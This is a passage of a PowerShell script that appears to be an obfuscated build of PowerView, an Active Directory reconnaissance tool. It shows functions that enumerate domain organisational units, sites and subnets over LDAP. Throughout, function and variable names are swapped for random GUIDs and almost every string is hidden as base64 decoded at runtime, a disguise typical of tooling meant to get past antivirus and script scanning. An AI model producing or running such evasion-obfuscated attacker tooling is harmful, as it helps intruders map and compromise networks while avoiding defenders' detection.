                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7ADcAZQBlAGYAMAA1ADEANwBhAGYAZQA5ADQANQA5ADcAYQBmADgAYQBiADQAYgBlADMAOQBhADcAMgA0ADUAMQB9ACcAIABmAHIAbwBtACAAJwAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AJwA=')))
                        ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${7eef0517afe94597af8ab4be39a72451}
                        ${7584c870544f4d57b8bf0299151060ee} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
                        if (-not ${7584c870544f4d57b8bf0299151060ee}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAHMAZQBhAHIAYwBoAGUAcgAgAGYAbwByACAAJwAkAHsANwBlAGUAZgAwADUAMQA3AGEAZgBlADkANAA1ADkANwBhAGYAOABhAGIANABiAGUAMwA5AGEANwAyADQANQAxAH0AJwA=')))
                        }
                    }
                }
                else {
                    try {
                        ${a58a88389bba4f499974f2986992284e} = (-Join (([Guid]${56aaa31f880a49e195bcf739ac331528}).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkADEA')))
                        ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AGEANQA4AGEAOAA4ADMAOAA5AGIAYgBhADQAZgA0ADkAOQA5ADcANABmADIAOQA4ADYAOQA5ADIAMgA4ADQAZQB9ACkA')))
                    }
                    catch {
                        ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJAB7ADUANgBhAGEAYQAzADEAZgA4ADgAMABhADQAOQBlADEAOQA1AGIAYwBmADcAMwA5AGEAYwAzADMAMQA1ADIAOAB9ACkA')))
                    }
                }
            }
            if (${fb29aaa2f9c140909efae41cb42f1bef} -and (${fb29aaa2f9c140909efae41cb42f1bef}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBmAGIAMgA5AGEAYQBhADIAZgA5AGMAMQA0ADAAOQAwADkAZQBmAGEAZQA0ADEAYwBiADQAMgBmADEAYgBlAGYAfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAEwAaQBuAGsA')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAE8AVQBzACAAdwBpAHQAaAAgACQAewBlADkAYQBmADAANgAwADYAMQAyADEANQA0ADgAMQA2AGEAYgBmADkAMAAwADcAOQBkADYAMQAxAGEAZgAzAGEAfQAgAHMAZQB0ACAAaQBuACAAdABoAGUAIABnAHAATABpAG4AawAgAHAAcgBvAHAAZQByAHQAeQA=')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHAAbABpAG4AawA9ACoAJAB7AGUAOQBhAGYAMAA2ADAANgAxADIAMQA1ADQAOAAxADYAYQBiAGYAOQAwADAANwA5AGQANgAxADEAYQBmADMAYQB9ACoAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAAVQBzAGkAbgBnACAAYQBkAGQAaQB0AGkAbwBuAGEAbAAgAEwARABBAFAAIABmAGkAbAB0AGUAcgA6ACAAJABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            ${7584c870544f4d57b8bf0299151060ee}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AbwByAGcAYQBuAGkAegBhAHQAaQBvAG4AYQBsAFUAbgBpAHQAKQAkAEYAaQBsAHQAZQByACkA')))
            Write-Verbose "[Get-DomainOU] Get-DomainOU filter string: $(${7584c870544f4d57b8bf0299151060ee}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${c1d2f3b775df48dfbe092797965c6f30} = ${7584c870544f4d57b8bf0299151060ee}.FindOne() }
            else { ${c1d2f3b775df48dfbe092797965c6f30} = ${7584c870544f4d57b8bf0299151060ee}.FindAll() }
            ${c1d2f3b775df48dfbe092797965c6f30} | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ${3eef9c8229d74620a0a29629c68dd7d1} = $_
                }
                else {
                    ${3eef9c8229d74620a0a29629c68dd7d1} = ac8c47b8977f4b0f9b4bbd3cb21b1a28 -Properties $_.Properties
                }
                ${3eef9c8229d74620a0a29629c68dd7d1}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBPAFUA'))))
                ${3eef9c8229d74620a0a29629c68dd7d1}
            }
            if (${c1d2f3b775df48dfbe092797965c6f30}) {
                try { ${c1d2f3b775df48dfbe092797965c6f30}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                }
            }
            ${7584c870544f4d57b8bf0299151060ee}.dispose()
        }
    }
}
function da03d47a936449b487ea369a2ced591f {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        ${e9af060612154816abf90079d611af3a},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{
            'SearchBasePrefix' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwBpAHQAZQBzACwAQwBOAD0AQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgA=')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${366b2622438942e384abf4d908835f24} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
    }
    PROCESS {
        if (${366b2622438942e384abf4d908835f24}) {
            ${fb29aaa2f9c140909efae41cb42f1bef} = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                ${56aaa31f880a49e195bcf739ac331528} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${56aaa31f880a49e195bcf739ac331528} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQAuACoA')))) {
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${7eef0517afe94597af8ab4be39a72451} = ${56aaa31f880a49e195bcf739ac331528}.SubString(${56aaa31f880a49e195bcf739ac331528}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAEUAeAB0AHIAYQBjAHQAZQBkACAAZABvAG0AYQBpAG4AIAAnACQAewA3AGUAZQBmADAANQAxADcAYQBmAGUAOQA0ADUAOQA3AGEAZgA4AGEAYgA0AGIAZQAzADkAYQA3ADIANAA1ADEAfQAnACAAZgByAG8AbQAgACcAJAB7ADUANgBhAGEAYQAzADEAZgA4ADgAMABhADQAOQBlADEAOQA1AGIAYwBmADcAMwA5AGEAYwAzADMAMQA1ADIAOAB9ACcA')))
                        ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${7eef0517afe94597af8ab4be39a72451}
                        ${366b2622438942e384abf4d908835f24} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
                        if (-not ${366b2622438942e384abf4d908835f24}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAFUAbgBhAGIAbABlACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAZABvAG0AYQBpAG4AIABzAGUAYQByAGMAaABlAHIAIABmAG8AcgAgACcAJAB7ADcAZQBlAGYAMAA1ADEANwBhAGYAZQA5ADQANQA5ADcAYQBmADgAYQBiADQAYgBlADMAOQBhADcAMgA0ADUAMQB9ACcA')))
                        }
                    }
                }
                else {
                    try {
                        ${a58a88389bba4f499974f2986992284e} = (-Join (([Guid]${56aaa31f880a49e195bcf739ac331528}).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkADEA')))
                        ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AGEANQA4AGEAOAA4ADMAOAA5AGIAYgBhADQAZgA0ADkAOQA5ADcANABmADIAOQA4ADYAOQA5ADIAMgA4ADQAZQB9ACkA')))
                    }
                    catch {
                        ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJAB7ADUANgBhAGEAYQAzADEAZgA4ADgAMABhADQAOQBlADEAOQA1AGIAYwBmADcAMwA5AGEAYwAzADMAMQA1ADIAOAB9ACkA')))
                    }
                }
            }
            if (${fb29aaa2f9c140909efae41cb42f1bef} -and (${fb29aaa2f9c140909efae41cb42f1bef}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBmAGIAMgA5AGEAYQBhADIAZgA5AGMAMQA0ADAAOQAwADkAZQBmAGEAZQA0ADEAYwBiADQAMgBmADEAYgBlAGYAfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAEwAaQBuAGsA')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIABzAGkAdABlAHMAIAB3AGkAdABoACAAJAB7AGUAOQBhAGYAMAA2ADAANgAxADIAMQA1ADQAOAAxADYAYQBiAGYAOQAwADAANwA5AGQANgAxADEAYQBmADMAYQB9ACAAcwBlAHQAIABpAG4AIAB0AGgAZQAgAGcAcABMAGkAbgBrACAAcAByAG8AcABlAHIAdAB5AA==')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHAAbABpAG4AawA9ACoAJAB7AGUAOQBhAGYAMAA2ADAANgAxADIAMQA1ADQAOAAxADYAYQBiAGYAOQAwADAANwA5AGQANgAxADEAYQBmADMAYQB9ACoAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAFUAcwBpAG4AZwAgAGEAZABkAGkAdABpAG8AbgBhAGwAIABMAEQAQQBQACAAZgBpAGwAdABlAHIAOgAgACQATABEAEEAUABGAGkAbAB0AGUAcgA=')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            ${366b2622438942e384abf4d908835f24}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcwBpAHQAZQApACQARgBpAGwAdABlAHIAKQA=')))
            Write-Verbose "[Get-DomainSite] Get-DomainSite filter string: $(${366b2622438942e384abf4d908835f24}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${c1d2f3b775df48dfbe092797965c6f30} = ${366b2622438942e384abf4d908835f24}.FindAll() }
            else { ${c1d2f3b775df48dfbe092797965c6f30} = ${366b2622438942e384abf4d908835f24}.FindAll() }
            ${c1d2f3b775df48dfbe092797965c6f30} | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ${4e5dca7a199b42e0821302978284a2e4} = $_
                }
                else {
                    ${4e5dca7a199b42e0821302978284a2e4} = ac8c47b8977f4b0f9b4bbd3cb21b1a28 -Properties $_.Properties
                }
                ${4e5dca7a199b42e0821302978284a2e4}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAGkAdABlAA=='))))
                ${4e5dca7a199b42e0821302978284a2e4}
            }
            if (${c1d2f3b775df48dfbe092797965c6f30}) {
                try { ${c1d2f3b775df48dfbe092797965c6f30}.dispose() }
                catch {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQA')))
                }
            }
            ${366b2622438942e384abf4d908835f24}.dispose()
        }
    }
}
function Get-DomainSubnet {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{
            'SearchBasePrefix' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwB1AGIAbgBlAHQAcwAsAEMATgA9AFMAaQB0AGUAcwAsAEMATgA9AEMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4A')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${d55af0d49294433fa1a30e317fe3d6fb} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
    }
    PROCESS {
        if (${d55af0d49294433fa1a30e317fe3d6fb}) {
            ${fb29aaa2f9c140909efae41cb42f1bef} = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                ${56aaa31f880a49e195bcf739ac331528} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${56aaa31f880a49e195bcf739ac331528} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQAuACoA')))) {
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${7eef0517afe94597af8ab4be39a72451} = ${56aaa31f880a49e195bcf739ac331528}.SubString(${56aaa31f880a49e195bcf739ac331528}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAdQBiAG4AZQB0AF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsANwBlAGUAZgAwADUAMQA3AGEAZgBlADkANAA1ADkANwBhAGYAOABhAGIANABiAGUAMwA5AGEANwAyADQANQAxAH0AJwAgAGYAcgBvAG0AIAAnACQAewA1ADYAYQBhAGEAMwAxAGYAOAA4ADAAYQA0ADkAZQAxADkANQBiAGMAZgA3ADMAOQBhAGMAMwAzADEANQAyADgAfQAnAA==')))
                        ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${7eef0517afe94597af8ab4be39a72451}
